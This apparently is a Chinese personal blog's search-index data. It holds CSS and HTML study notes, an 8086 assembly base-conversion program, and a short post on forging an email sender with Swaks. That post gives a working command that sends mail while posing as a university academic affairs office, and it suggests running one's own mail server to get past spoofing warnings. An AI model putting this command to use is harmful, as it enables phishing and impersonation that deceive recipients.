*/#my-item.big.color &#123; transform: scale(1.2); background-color: lightblue;&#125; 通配符选择器 * p[id]：具有id属性的p标签 p[type=text] 伪元素选择器12345678910111213141516171819202122232425/* 每个p标签的第一个字符 */p::first-letter &#123; color: red;&#125;/* 每个p标签的第一行 */p::first-line &#123; color: red;&#125;/* 被选中的p标签 */p::selection &#123; color: green; background-color: black;&#125;/* h1标签的前后分别添加内容 */h1::before &#123; content: &quot;《&quot;; color: red;&#125;h1::after &#123; content: &quot;》&quot;; color: red;&#125; 优先级 先来后到：后面定义的样式会覆盖前面定义的样式 越具体越优先：全局选择器 &lt; 标签选择器 &lt; class选择器 &lt; id选择器 &lt; 行内样式表 权重 &gt; 次序 12345/* 将height临时设置为最高优先级 */p &#123; width: 300px; height: 300px !important; &#125; 颜色 单词 16进制 RGB RGBA 取色：网页内ctrl+shift+c快速选中；QQ截图+ctrl+c复制16进制色号 文本/文字子标签会继承父标签的文本属性 对齐水平居中12345678h4 &#123; text-align: center;&#125;/* 左右对齐，多行起作用 */.mydiv &#123; text-align: justify;&#125; 竖直居中12/* 行高 */line-height = 元素高度 单位如果要兼容价大屏幕就要少用固定单位px px %：相对于父元素的比例 em：相对于当前属性的倍数 rem：相对于根元素属性的倍数 vw：当前屏幕宽度的百分比 vh：当前屏幕高度的百分比 字间距1letter-spacing: 0.1em; 缩进12/* 两个字 */text-indent: 2em; 文本修饰MDN搜索text-decoration 12/* 去掉链接下划线 */text-decoration: none; 文本阴影 x方向偏移 y方向偏移 模糊半径(可省) 阴影颜色 12345text-shadow: 1.5px 1px 2px lightcoral;/* 可以操作多次 */text-shadow: 1.5px 1px 2px lightcoral, -1.5px -1px 2px lightcoral; 字体 font-size font-style font-weight: 数值没有单位，不是px font-family: monospace 等宽字体 font-face：引入外部字体 背景1234567891011121314151617181920212223242526272829.mydiv &#123; width: 700px; height: 500px; /* 背景图片 */ background-image: url(../images/background.jpg), url(../images/logo.jpg); /* 背景使用渐变色 */ background-image: linear-gradient(lightblue, lightcoral); /* 背景大小 */ /* 50% 100% */ background-size: 700px 500px, cover; /* 背景颜色 */ background-color: lightblue; /* 图片是否重复 */ /* repeat-x */ /* repeat-y */ /* no-repeat */ background-repeat: no-repeat; /* 背景位置 */ /* right top */ /* left bottom */ background-position: left top, center top; /* 背景是否随标签一起在页面滚动 */ background-attachment: fixed; /* 背景透明度, 对颜色和图片都会起作用 */ opacity: 0.5;&#125; 边框1234567border-style: solid;border-width: 4px;border-color: black;/* radius可以定义很多不规则图形-MDN */border-radius: 15px;/* 边框重合-不常用 */border-collapse: collapse; 展示格式注意：元素宽度和高度=content+内边距padding+边框border+外边距margin display123display: inline;display: block;display: inline-block; block 独占一行 width: 100% inline 共用一行 宽度=内容宽度 设置width和height没有作用 只用水平方向的内外边距有作用 inline-block 常见：img 可以共占一行 宽高可设置 overflow设置超出部分的内容 12345678/* 超出部分使用滚轮 */overflow: auto;/* 隐藏超出部分 */overflow: hidden;/* 关闭横向滚轮 */overflow-x: hidden;/* 关闭纵向滚轮 */overflow-y: hidden; text-overflow12/* 超出部分使用...代替（用户名过长） */text-overflow: ellipsis; 边距注意：避免在两个方向上对同一边距的定义 外边距该属性定义的是外边距至少是多少——相邻的外边距取最大值 margin margin-top margin-right margin-bottom margin-left 注： 没有提供默认使用对面的值 父元素没有定义边框的话会与子元素合并使用，可以对父元素使用如下代码 1234.div-outer::before &#123; content: &quot;&quot;; display: table;&#125; 内边距1padding: 20px 20px 30px 40px; 盒子模型 content-box：默认选项，修改border和padding会改变元素大小； border-box：修改border和padding不会改变元素大小 1box-sizing: border-box; 布局positionhttps://www.acwing.com/blog/content/16282/ 元素重叠可以使用z-index控制重叠次序，需要将position修改为非static position: static：默认 position: relative：相对于默认的位置使用top: 10px、right: px等改变位置，并且其默认位置会保留 position: absolute：相对于第一个非static的父元素，原来的默认位置会剔除，随页面滚动 position: fixed：相对于第一个非static的父元素，原来的默认位置会剔除，始终固定在视窗上，不随页面滚动 postion: sticky 浮动123float: left/right;/* 清除错误浮动 */clear: left/right/both; flex布局注意：控制flex布局是改变父元素的display属性, inline-block等是改变当前元素 水平-主轴 竖直-交叉轴 排列方式1234567display: flex;/* 默认row row-reverse(从右往左) column column-reverse(从下往上) */flex-direction: row; /* 默认nowrap wrap(换行) wrap-reverse */flex-wrap: wrap;/* 上面两个的缩写，默认row nowrap */flex-flow: column wrap; 对齐方式水平对齐1justify-content flex-start：左对齐 flex-end：右对齐 center：居中 space-between：两端对齐 竖直对齐1align-items flex-start：上对齐(默认) flex-end：下对齐 center：居中 strech：铺展(元素未定义高度的前提) 1align-content 竖直方向元素之间没有空隙 只有一行无法居中，可以使用align-items 内部元素属性排列方式和对齐方式都是父元素的属性，下列是定义在子元素的属性 order：元素优先级，越小越靠前 flex-grow: n：拥有该属性的元素随屏幕一同伸展，n越大，伸展占比越大 flex-shrink: n：缩小比例 flex-basis: 100px：元素的初始宽度，优先级高于width 上面的属性可以统一使用flex缩写 12345/* 弹性变大和缩小，不换行 */flex: auto;/* 不变大不缩小，不换行 */flex: none; 响应式布局之Bootstrap下载地址：Bootstrap 使用：在官网寻找适合的示例进行修改 media查询12345678910111213/* 大于等于768px的情况 */@media (min-width: 768px) &#123; .card &#123; background-color: lightgreen; &#125;&#125;/* 小于等于992px的情况 */@media (max-width: 992px) &#123; .card &#123; background-color: lightcoral; &#125;&#125; 引入12&lt;link rel=&quot;stylesheet&quot; href=&quot;./static/third_party/bootstrap-5.3.0-alpha1-dist/css/bootstrap.min.css&quot;&gt;&lt;script src=&quot;./static/third_party/bootstrap-5.3.0-alpha1-dist/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; 注意： 使用的时候要用包裹在container中 row里面接的元素必须是col或如col-md-6等 栅格1234567&lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;row&quot;&gt; &lt;div class=&quot;col col-md-6 col-sm-12 col-xs-12&quot;&gt;用户名&lt;/div&gt; &lt;div class=&quot;col col-md-6 col-sm-12 col-xs-12&quot;&gt;密码&lt;/div&gt; &lt;div class=&quot;col col-md-12 col-sm-12 col-xs-12&quot;&gt;个人简介&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 表单123456789101112131415161718&lt;div class=&quot;container&quot;&gt; &lt;form&gt; &lt;div class=&quot;mb-3&quot;&gt; &lt;label for=&quot;exampleInputEmail1&quot; class=&quot;form-label&quot;&gt;Email address&lt;/label&gt; &lt;input type=&quot;email&quot; class=&quot;form-control&quot; id=&quot;exampleInputEmail1&quot; aria-describedby=&quot;emailHelp&quot;&gt; &lt;div id=&quot;emailHelp&quot; class=&quot;form-text&quot;&gt;We&#x27;ll never share your email with anyone else.&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;mb-3&quot;&gt; &lt;label for=&quot;exampleInputPassword1&quot; class=&quot;form-label&quot;&gt;Password&lt;/label&gt; &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;exampleInputPassword1&quot;&gt; &lt;/div&gt; &lt;div class=&quot;mb-3 form-check&quot;&gt; &lt;input type=&quot;checkbox&quot; class=&quot;form-check-input&quot; id=&quot;exampleCheck1&quot;&gt; &lt;label class=&quot;form-check-label&quot; for=&quot;exampleCheck1&quot;&gt;Check me out&lt;/label&gt; &lt;/div&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Submit&lt;/button&gt; &lt;/form&gt;&lt;/div&gt;","tags":"css"},{"title":"HTML笔记","url":"/post/a0ca7bc4.html","text":"HTML插件live serverauto rename tag vscode快捷键 ! + enter：快速生成html框架 alt + up / down：快速移动一行 标签*n：生成n个指定标签 文档MDN 标签meta网页描述1&lt;meta name=&quot;description&quot; content=&quot;day day up&quot;&gt; 网页关键词1&lt;meta name=&quot;keywords&quot; content=&quot;c++,python,app&quot;&gt; 网页logo123&lt;head&gt; &lt;link rel=&quot;icon&quot; href=&quot;./images/logo.png&quot;&gt;&lt;/head&gt; hr 水平线 默认居中不需要设置 1&lt;hr color=&quot;brown&quot; width=&quot;300px&quot; size=&quot;25&quot; align=&quot;left&quot;&gt; pre保留文本原有格式——不删除空格和回车等宽字体 mark荧光笔 widthwidth是img等标签的属性，可以使用百分数实现动态变化 12&lt;img src=&quot;./static/images/logo.png&quot; alt=&quot;logo&quot; style=&quot;width: 50%;&quot;&gt; audio音频标签第一种写法 1&lt;audio controls src=&quot;./audios/bgm.mp3&quot;&gt;无法播放&lt;/audio&gt; 第二种写法第一个source无法播放会使用第二个，直到找到可以播放的音乐 12345&lt;audio controls&gt; &lt;source src=&quot;./audios/bgm.mp3&quot; type=&quot;audio/mpeg&quot;&gt; &lt;source src=&quot;./audios/sound1.mp3&quot; type=&quot;audio/mpeg&quot;&gt; &lt;source src=&quot;./audios/sound2.mp3&quot; type=&quot;audio/mpeg&quot;&gt;&lt;/audio&gt; video视频标签 第二种写法 1&lt;video width=&quot;400&quot; controls src=&quot;./vedios/video1.mp4&quot;&gt;&lt;/video&gt; 第一种写法 1234&lt;video controls width=&quot;800&quot;&gt; &lt;source src=&quot;./videos/video1.mp4&quot; type=&quot;video/mp4&quot;&gt; &lt;source src=&quot;./videos/video2.mp4&quot; type=&quot;video/mp4&quot;&gt;&lt;/video&gt; img 只设置width会保留原始比例 title：鼠标悬停提示 1&lt;img src=&quot;D:\\Blog\\photos\\wallhaven-85dp61 (1).jpg&quot; alt=&quot;study&quot; width=&quot;800&quot; height=&quot;600&quot; title=&quot;study&quot;&gt; a超链接 123&lt;a href=&quot;./about.html&quot; target=&quot;_blank&quot;&gt; &lt;img width=&quot;50&quot; src=&quot;./images/logo.png&quot; alt=&quot;DQY&amp;WYの小窝&quot;&gt;&lt;/a&gt; a标签不仅可以指向外部链接，还可以指向内部元素 123&lt;a href=&quot;#my_pos&quot;&gt;where is I?&lt;/a&gt;&lt;p id=&quot;my_pos&quot;&gt;I&#x27;m here&lt;/p&gt; ol（ordered list） 有序列表 快捷键：ol&gt;li*3 type=”1/A/a/I/i” 12345678910111213141516&lt;ol type=&quot;a&quot;&gt; &lt;li&gt;昵称 &lt;ol type=&quot;i&quot;&gt; &lt;li&gt;悦&lt;/li&gt; &lt;li&gt;乖乖&lt;/li&gt; &lt;li&gt;傻傻&lt;/li&gt; &lt;/ol&gt; &lt;/li&gt; &lt;li&gt;爱好 &lt;ol type=&quot;I&quot;&gt; &lt;li&gt;吃饭&lt;/li&gt; &lt;li&gt;睡觉&lt;/li&gt; &lt;li&gt;宋江&lt;/li&gt; &lt;/ol&gt; &lt;/li&gt;&lt;/ol&gt; ul（unordered list） 无序列表 快捷键：ul&gt;li*3 使用同ol type=”disc”：默认实心圆 type=”circle”：空心圆 type=”square”：小方块 type=”none”：不显示 导航一般都是使用无序列表实现(css调整横向展示) table 快捷键 1234567891011121314151617181920212223242526272829303132table&gt;tr*3&gt;td*2&#123;单元格&#125;&lt;table&gt; &lt;caption&gt;成绩单&lt;/caption&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;数学&lt;/th&gt; &lt;th&gt;语文&lt;/th&gt; &lt;th&gt;英语&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td&gt;Alice&lt;/td&gt; &lt;td&gt;100&lt;/td&gt; &lt;td&gt;99&lt;/td&gt; &lt;td&gt;98&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Bob&lt;/td&gt; &lt;td&gt;99&lt;/td&gt; &lt;td&gt;98&lt;/td&gt; &lt;td&gt;97&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Tom&lt;/td&gt; &lt;td&gt;98&lt;/td&gt; &lt;td&gt;97&lt;/td&gt; &lt;td&gt;96&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt; 不设置border默认无边框 合并单元格（保留带标签的）：colspan -&gt; 水平合并；rowspan -&gt; 垂直合并 1234567891011121314151617&lt;table border=&quot;2&quot; width=&quot;400&quot; height=&quot;300&quot;&gt; &lt;tr&gt; &lt;td&gt;单元格1&lt;/td&gt; &lt;td colspan=&quot;2&quot;&gt;单元格2&lt;/td&gt; &lt;!-- &lt;td&gt;单元格3&lt;/td&gt; --&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td rowspan=&quot;2&quot;&gt;单元格4&lt;/td&gt; &lt;td colspan=&quot;2&quot; rowspan=&quot;2&quot;&gt;单元格5&lt;/td&gt; &lt;!-- &lt;td&gt;单元格6&lt;/td&gt; --&gt; &lt;/tr&gt; &lt;tr&gt; &lt;!-- &lt;td&gt;单元格7&lt;/td&gt; --&gt; &lt;!-- &lt;td&gt;单元格8&lt;/td&gt; --&gt; &lt;!-- &lt;td&gt;单元格9&lt;/td&gt; --&gt; &lt;/tr&gt;&lt;/table&gt; label标签，点击该元素会跳转到其绑定元素，通过id进行绑定 1234567&lt;!-- form包裹的内容会在submit按钮之后全部提交 --&gt;&lt;form&gt; &lt;label for=&quot;username&quot;&gt;用户名&lt;/label&gt; &lt;!-- input中的name是url中的参数名称 --&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot;&gt; &lt;button type=&quot;submit&quot;&gt;提交&lt;/button&gt;&lt;/form&gt; input123456&lt;input type=&quot;text&quot;&gt;&lt;input type=&quot;number&quot;&gt;&lt;input type=&quot;email&quot;&gt;&lt;input type=&quot;password&quot;&gt;&lt;input type=&quot;radio&quot;&gt;&lt;input type=&quot;file&quot;&gt; radio单选，name一样的radio是互斥的 1234567891011&lt;br&gt;&lt;label for=&quot;cpp&quot;&gt;cpp&lt;/label&gt;&lt;input type=&quot;radio&quot; name=&quot;lang&quot; id=&quot;cpp&quot; value=&quot;cpp&quot;&gt;&lt;br&gt;&lt;label for=&quot;python&quot;&gt;python&lt;/label&gt;&lt;input type=&quot;radio&quot; name=&quot;lang&quot; id=&quot;python&quot; value=&quot;python&quot;&gt;&lt;br&gt;&lt;label for=&quot;go&quot;&gt;go&lt;/label&gt;&lt;input type=&quot;radio&quot; name=&quot;lang&quot; id=&quot;go&quot; value=&quot;go&quot;&gt; textarea多行的输入框 12&lt;label for=&quot;comment&quot;&gt;&lt;/label&gt;&lt;textarea name=&quot;comment&quot; id=&quot;comment&quot; cols=&quot;30&quot; rows=&quot;2&quot; placeholde=&quot;评论&quot;&gt;&lt;/textarea&gt; select选项 123456&lt;label for=&quot;sex&quot;&gt;性别&lt;/label&gt;&lt;select name=&quot;sex&quot; id=&quot;sex&quot;&gt; &lt;option value=&quot;&quot;&gt;请选择&lt;/option&gt; &lt;option value=&quot;man&quot;&gt;man&lt;/option&gt; &lt;option value=&quot;woman&quot;&gt;woman&lt;/option&gt;&lt;/select&gt;","tags":"html"},{"title":"简单伪造邮件发件人","url":"/post/2db28f9b.html","text":"使用Swaks伪造邮件发件人安装Swaks1apt install swaks 测试连接使用命令swaks --to &lt;测试邮箱&gt;对目标邮箱的状态进行测试。 从图中可以看出，返回250ok，说明该邮箱存在，并且可以正常收信。 从上图可以看出，最后返回550报错，这是因为没有使用授权码导致SPF校验不通过。 获取授权码以163邮箱为例，点击首页的设置选项，选择POP3/SMTP3IMAP 开启下方两个服务并记录生成的授权码 伪造发件人和内容构造邮件内容，使用163邮箱发送邮件 1swaks --to &lt;目标邮箱&gt; --from &lt;163的邮箱&gt; --h-From: &#x27;教务处 &lt;admin@cqupt.eud.cn&gt;&#x27; --body &quot;今晚九点学生处开会。&quot; --server smtp.163.com -p 25 -au &lt;163的邮箱&gt; -ap 授权码 实现效果手机端通知栏看到的效果 手机端QQ邮箱看到的效果 PC端通知栏看到的效果 PC端QQ邮箱看到的效果 缺点从图中可以看到，在发件人的下方有一栏显示该邮件是由dqy1016751306@163.com代发，且QQ邮箱检测到了该邮件的实际发件人和声明发件人不一致并给出了警告。后续可以尝试自行搭建邮件服务器解决。","tags":"邮件伪造"},{"title":"汇编实现进制转换和显存输出","url":"/post/43fda7c0.html","text":"实现功能 键盘输入任意小于65536的数字，输出对应二进制、八进制、十六进制形式； 自定义字体颜色、背景色以及输出在显存的位置； 对输入数据执行去除前缀零、长度校验、大小校验等处理，并对累加过程中的五位数加法溢出进行过滤； 数据无效或累加过程出现溢出允许用户重新输入； 允许用户对合法数据进行连续累加。 源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493DATA SEGMENT MYSTR DB 20H DUP(?) ; FFFF = 65535 NEWSTR DB 20H DUP(?) ; 待增加的数字 MSG DB &#x27;Please input your number: $&#x27; ADD_MSG DB &#x27;Input the number you wanna add: $&#x27; OUTPUT_B DB &#x27;The Binary form is: &#x27; ; 20 + 16(MAX) OUTPUT_O DB &#x27;The Octal form is: &#x27; ; 20 + 6 OUTPUT_H DB &#x27;The Hex form is: &#x27; ; 20 + 4 ERROR_MSG DB &#x27;ERROR: Your input is invalid, please enter an integer between 0 and 65535$&#x27; AGAIN DB &#x27;Enter Y/y to continue Or any other letter to exit:$&#x27; ADDMORE DB &#x27;Enter Y/y to continue to add a new number Or any other letter to exit:$&#x27; MAX_NUM DB &#x27;65535&#x27; RES DW 0 ; 字符串转换后的结果 NEWLINE DB 0AH, 0DH, &#x27;$&#x27; CLEAR DB 4000 DUP(&#x27; &#x27;), &#x27;$&#x27; FRAME_CHAR DB &#x27;*&#x27; COLOR_MSG DB 24h ; 绿底红字 COLOR_NUM DB 4Ah ; 红底绿字高亮 COLOR_FRAME DB 1CH ; 蓝底红字高亮DATA ENDSSTACK SEGMENT STACK DB 20 DUP(?) TOP LABEL WORD ; 栈顶指针STACK ENDSCODE SEGMENT ASSUME CS: CODE, DS: DATA, SS: STACK START: MOV AX, DATA MOV DS, AX MOV AX, STACK MOV SS, AX LEA SP, TOP INPUT: LEA DX, MSG ; 输出提示信息 MOV AH, 09H INT 21H LEA DX, NEWLINE ; 换行 MOV AH, 09H INT 21H LEA DX, MYSTR ; 接收输入 MOV BX, DX MOV AL, 20 MOV DS:[BX], AL ; 字符串第一个字节存储最大字符个数 MOV AH, 0AH INT 21H XOR CH, CH MOV SI, DX ; 字符串存储地址 MOV CL, [SI + 1] ; 实际字符个数 ADD SI, 2 ; 指向第一个字符 READY: CALL CLEAR_FRONT ; 消除前缀0 CALL CHECK_LEN ; 检测数据长度 CALL CHECK_FIVE_DIGITS ; 检测五位数是否大于65535 SUB CL, 1 ; 循环LEN - 1次 XOR DX, DX ; 存放和 CMP CL, 0 JZ LAST ; 一位数不需要乘, 会导致CX = 0FFH STR_TO_NUM: MOV BL, [SI] INC SI SUB BL, 30H ; 不减先加可能会对CF造成影响 CALL CHECK_NUM ; 检测每一位数是否合规 ADD DL, BL ADC DX, 0 ; 进位 MOV AX, 0AH MUL DX MOV DX, AX LOOP STR_TO_NUM LAST: MOV BL, [SI] SUB BL, 30H ; 不减先加可能会对CF造成影响 CALL CHECK_NUM ; 检测每一位数是否合规 MOV AL, [SI] SUB AL, 30H ADD DL, AL ; 最后一个数不用乘 ADC DX, 0 MOV RES, DX CLEAN: LEA DX, CLEAR ; 清空整页 MOV AH, 09H INT 21H FRAME_UP: MOV AX, 0B866H ; 跳过前10行，跳过21个字符(80 - 36 - 2 &gt;&gt; 1) MOV ES, AX LEA SI, FRAME_CHAR MOV DI, 0AH ; 偏移地址 MOV CX, 38 ; 38个&#x27;*&#x27; PAINT_FRAME_UP: MOV AL, [SI] MOV ES:[DI], AL INC DI MOV AL, COLOR_FRAME MOV ES:[DI], AL INC DI LOOP PAINT_FRAME_UP FRAME_DOWN: MOV AX, ES ADD AX, 28H ; 加四行，段地址需要除以16 MOV ES, AX MOV DI, 0AH MOV CX, 38 PAINT_FRAME_DOWN: MOV AL, [SI] MOV ES:[DI], AL INC DI MOV AL, COLOR_FRAME MOV ES:[DI], AL INC DI LOOP PAINT_FRAME_DOWN FRAME_SIDE: MOV AX, 0B870H MOV ES, AX MOV DI, 0AH LEA SI, FRAME_CHAR MOV CX, 3 ; 3行 PAINT_FRAME_SIDE: PUSH CX PUSH DI PUSH AX MOV CX, 2 MOV ES, AX PAINT_ONE_LINE: MOV AL, [SI] MOV ES:[DI], AL INC DI MOV AL, COLOR_FRAME MOV ES:[DI], AL ADD DI, 72 ; 跳过36个字符 INC DI LOOP PAINT_ONE_LINE POP AX ADD AX, 0AH ; 0A * 16 = 160 POP DI POP CX LOOP PAINT_FRAME_SIDE MOV AX, 0B870H ; 段地址，跳过前11行，跳过22个字符 MOV ES, AX LEA SI, OUTPUT_B MOV DI, 0CH MOV CX, 20 COLORFUL_OUTPUT_B: ; 输出二进制提示信息 MOV AL, [SI] MOV ES:[DI], AL INC DI MOV AL, COLOR_MSG MOV ES:[DI], AL INC SI INC DI LOOP COLORFUL_OUTPUT_B MOV CX, 16 MOV BX, RES PRINT_B: ROL BX, 1 ; 循环左移一位，将最高位移到最低位 MOV AX, BX AND AL, 01H ; 将除了最低位的其他位置清零 ADD AL, 30H MOV ES:[DI], AL INC DI MOV AL, COLOR_NUM MOV ES:[DI], AL INC DI LOOP PRINT_B CLC ; CF清零 MOV AX, 0B87AH ; 段地址，跳过前12行，跳过22个字符 MOV ES, AX LEA SI, OUTPUT_O MOV DI, 0CH MOV CX, 20 COLORFUL_OUTPUT_O: ; 输出八进制提示信息 MOV AL, [SI] MOV ES:[DI], AL INC DI MOV AL, COLOR_MSG MOV ES:[DI], AL INC SI INC DI LOOP COLORFUL_OUTPUT_O MOV AX, RES ; 第一个八进制 ROL AX, 1 CLC ; CF清零 AND AL, 01H ADD AL, 30H MOV ES:[DI], AL INC DI MOV AL, COLOR_NUM MOV ES:[DI], AL INC DI MOV CX, 5 MOV BL, 0 ; 4，7，10，13，16 PRINT_O: PUSH CX MOV AX, RES ; 第二三四五六对应八进制 MOV CL, 4 ADD CL, BL ROL AX, CL ADD BL, 3 AND AL, 00000111B ADD AL, 30H MOV ES:[DI], AL INC DI MOV AL, COLOR_NUM MOV ES:[DI], AL INC DI POP CX LOOP PRINT_O CLC ; CF清零 MOV AX, 0B884H ; 段地址，跳过前13行，跳过22个字符 MOV ES, AX LEA SI, OUTPUT_H MOV DI, 0CH MOV CX, 20 COLORFUL_OUTPUT_H: ; 输出十六进制提示信息 MOV AL, [SI] MOV ES:[DI], AL INC DI MOV AL, COLOR_MSG MOV ES:[DI], AL INC SI INC DI LOOP COLORFUL_OUTPUT_H MOV CX, 4 MOV BL, 4 ; 步幅 PRINT_H: PUSH CX MOV DX, RES MOV CL, BL ADD BL, 4 ROL DX, CL CLC ; CF清零 AND DL, 00001111B CALL CONVERT MOV ES:[DI], DL INC DI MOV DL, COLOR_NUM MOV ES:[DI], DL INC DI POP CX LOOP PRINT_H ADDAGIN: LEA DX, ADDMORE MOV AH, 09H INT 21H LEA DX, NEWLINE ; 换行 MOV AH, 09H INT 21H MOV AH, 01H INT 21H CMP AL, &#x27;Y&#x27; ; 比较输入之前换行会修改AL JZ INPUT_AGAIN CMP AL, &#x27;y&#x27; JZ INPUT_AGAIN OVER: LEA DX, NEWLINE ; 换行 MOV AH, 09H INT 21H MOV AH, 4CH INT 21H INPUT_AGAIN: LEA DX, NEWLINE ; 输入Y/y跳转之后再换行 MOV AH, 09H INT 21H LEA DX, ADD_MSG MOV AH, 09H INT 21H LEA DX, NEWLINE ; 换行 MOV AH, 09H INT 21H LEA DX, NEWSTR MOV BX, DX MOV AL, 20 ; 设置最大字符数 MOV DS:[BX], AL MOV AH, 0AH INT 21H MOV SI, DX ; 指向新输入的字符串 MOV CL, [SI + 1] ; 新输入的字符串长度 ADD SI, 2 ; 指向第一个字符 CALL CLEAR_FRONT_NEW ; 清除新字符串的前缀零 ADD_NEW_TO_FIVE: CMP CL, 05H ; 比较新字符串是否是五位数 JZ ADD_OLD_TO_FIVE JA ERROR PUSH SI ; 存储新字符串起始位置 PUSH SI ADD SI, 4 MOV DI, SI ; DI指向五位数最后一位 POP SI XOR CH, CH PUSH CX DEC CX ADD SI, CX ; SI指向当前字符串最后一位 POP CX XOR CH, CH PUSH CX MOVE: MOV AL, [SI] MOV [DI], AL ; 依次后移 DEC SI DEC DI LOOP MOVE POP CX POP SI PUSH SI MOV AL, 5 SUB AL, CL ; AL = 5 - CL -&gt; 补零个数 MOV CL, AL ; 剩余位置补零 XOR CH, CH ADD_ZERO: MOV BYTE PTR [SI], 30H INC SI LOOP ADD_ZERO POP SI ; 新字符串的起始位置已经在CLEAR_FRONT中存入了最大长度字段 MOV CL, 05H ; 最终长度为5 LEA DI, NEWSTR MOV [DI + 1], CL ; 实际长度修改为5 ADD_OLD_TO_FIVE: LEA SI, MYSTR MOV CL, [SI + 1] ; 取出旧字符串实际长度 CMP CL, 05H JZ ADD_NEW_TO_OLD MOV SI, DS:[SI] ; SI指向旧字符串第一个字符 AND SI, 0FFH ; 高位字节清零 PUSH SI PUSH SI ADD SI, 4 MOV DI, SI ; DI指向五位数最后一位 POP SI PUSH CX DEC CL XOR CH, CH ADD SI, CX ; SI指向当前字符串最后一位 POP CX XOR CH, CH PUSH CX MOVE_OLD: MOV AL, [SI] MOV [DI], AL ; 依次后移 DEC SI DEC DI LOOP MOVE_OLD POP CX POP SI PUSH SI XOR CH, CH MOV AL, 5 SUB AL, CL MOV CL, AL ; 剩余位置补零 ADD_OLD_ZERO: MOV BYTE PTR [SI], 30H INC SI LOOP ADD_OLD_ZERO POP SI MOV CL, 05H ; 最终长度为5 LEA DI, MYSTR MOV [DI + 1], CL ; 实际长度修改为5 ADD_NEW_TO_OLD: LEA SI, NEWSTR MOV SI, [SI] ; 指向第一个字符 AND SI, 0FFH LEA DI, MYSTR MOV DI, [DI] ; 指向第一个字符 AND DI, 0FFH ADD SI, 4 ; SI指向新字符串第五位字符 ADD DI, 4 ; DI指向旧字符串第五位字符 MOV CX, 05H PUSH SI SUB_NEW_TO_NUM: ; 避免因为新旧字符串都有30H导致对CF造成影响 SUB BYTE PTR [SI], 30H ; 如果是WORD PTR, 30H高位为0，也没有影响 DEC SI LOOP SUB_NEW_TO_NUM POP SI CMP BYTE PTR [SI-4], 6 ; 判断五位数第一个数字是否合法，只要保证合法就不会发生五位数溢出 JA ERROR MOV CX, 05H ADD_NEW_AND_OLD: MOV AL, [SI] ADD [DI], AL MOV AL, [DI] CMP AL, 39H JA ABOVE_NINE NEXT: DEC SI DEC DI LOOP ADD_NEW_AND_OLD XOR CH, CH LEA SI, MYSTR ; 字符串存储地址 MOV CL, [SI + 1] ; 实际字符个数 MOV SI, [SI] ; 指向第一个字符 AND SI, 0FFH JMP READY ABOVE_NINE: ; 超出39，该位减十，高位加一 SUB AL, 0AH MOV [DI], AL MOV BX, DI DEC BX INC BYTE PTR [BX] JMP NEXT CONVERT: CMP DL, 0AH JB BELOW ADD DL, 07H BELOW: ADD DL, 30H RET CLEAR_FRONT: CMP CL, 01H JZ FINISH MOV AL, [SI] CMP AL, 30H ; &#x27;0&#x27; JNE FINISH INC SI ; 跳过当前字符 DEC CL ; 长度减一 JMP CLEAR_FRONT FINISH: LEA DI, MYSTR MOV [DI], SI ; 将第一个字符的位置存储到字符串的最大容量字段 MOV [DI + 1], CL ; 将修改后的长度填入字符串实际长度字段 RET CLEAR_FRONT_NEW: CMP CL, 01H JZ FINISH_NEW MOV AL, [SI] CMP AL, 30H ; &#x27;0&#x27; JNE FINISH_NEW INC SI ; 跳过当前字符 DEC CL ; 长度减一 JMP CLEAR_FRONT_NEW FINISH_NEW: LEA DI, NEWSTR MOV [DI], SI ; 将第一个字符的位置存储到字符串的最大容量字段 MOV [DI + 1], CL ; 将修改后的长度填入字符串实际长度字段 RET CHECK_LEN: CMP CL, 05H ; 最大65535，5位 JA ERROR RET CHECK_FIVE_DIGITS: PUSH CX ; 数据长度, PUSH至少是WORD PUSH SI ; 字符串指针 CMP CX, 05H JB CHECK_FIVE_FINISH ; 不到五位不用比较 LEA DI, MAX_NUM MOV CX, 05H CHECK_FIVE: MOV AL, [DI] CMP AL, [SI] JB ERROR JA CHECK_FIVE_FINISH INC DI INC SI LOOP CHECK_FIVE CHECK_FIVE_FINISH: POP SI POP CX RET CHECK_NUM: CMP BL, 09H ; 保证每位数字在0~9 JA ERROR RET ERROR: LEA DX, NEWLINE ; 换行, 保留用户输入 MOV AH, 09H INT 21H LEA DX, ERROR_MSG ; 错误提示 MOV AH, 09H INT 21H LEA DX, NEWLINE ; 换行 MOV AH, 09H INT 21H LEA DX, AGAIN MOV AH, 09H INT 21H LEA DX, NEWLINE ; 换行 MOV AH, 09H INT 21H MOV AH, 01H INT 21H CMP AL, &#x27;Y&#x27; JZ RESTART CMP AL, &#x27;y&#x27; JZ RESTART LEA DX, NEWLINE ; 换行 MOV AH, 09H INT 21H JMP OVER RESTART: LEA DX, CLEAR ; 清空整页 MOV AH, 09H INT 21H JMP INPUTCODE ENDS END START 运行截图① 输入合法数据：3456 ② 